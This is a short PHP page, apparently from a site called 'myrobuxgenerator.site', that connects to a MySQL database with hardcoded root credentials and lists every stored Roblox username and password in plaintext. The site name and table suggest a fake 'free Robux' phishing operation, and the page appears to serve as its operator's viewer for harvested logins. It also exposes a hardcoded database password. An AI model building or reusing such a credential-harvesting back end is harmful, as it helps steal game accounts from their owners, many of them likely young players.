<!doctype html>
<html>
	<head>
		<meta charset="utf-8">
		<title>Accounts created - myrobuxgenerator.site</title>
	</head>
	<body>
		<?php
		$servername = "127.0.0.1";
		$username = "root";
		$password = "poopoocaca51";
		$dbname = "maindatabase";

		// Create connection
		$conn = new mysqli($servername, $username, $password, $dbname);
		// Check connection
		if ($conn->connect_error) {
		  die("MySQL Connection failed: " . $conn->connect_error);
		}
		$sql = "SELECT * FROM robloxaccounts";
		$result = $conn->query($sql);

		if ($result->num_rows > 0) {
		  // output data of each row
		  while($row = $result->fetch_assoc()) {
			echo "USERNAME: " . $row["username"]. " - PASSWORD: " . $row["password"]. " TIME CREATEED: " . $row["timecreated"]. "<br>";
		  }
		} else {
		  echo "0 results in SQL Query, table is empty.";
		}
		$conn->close();
		?>
	</body>
</html>
